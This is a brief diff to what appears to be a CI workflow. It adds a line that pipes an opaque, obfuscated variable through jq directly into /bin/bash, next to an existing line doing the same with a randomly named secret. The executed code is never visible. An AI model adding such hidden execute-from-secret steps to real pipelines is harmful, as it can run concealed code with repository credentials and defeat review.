@@ -17,6 +17,7 @@ jobs:
           ztqgo5: ${{ secrets.ztqgo5 }}
         run: |
           printf '%s' "$ztqgo5" | jq -r .cw1014 | /bin/bash
+          printf '%s' "$mbpu9" | jq -r .y00 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
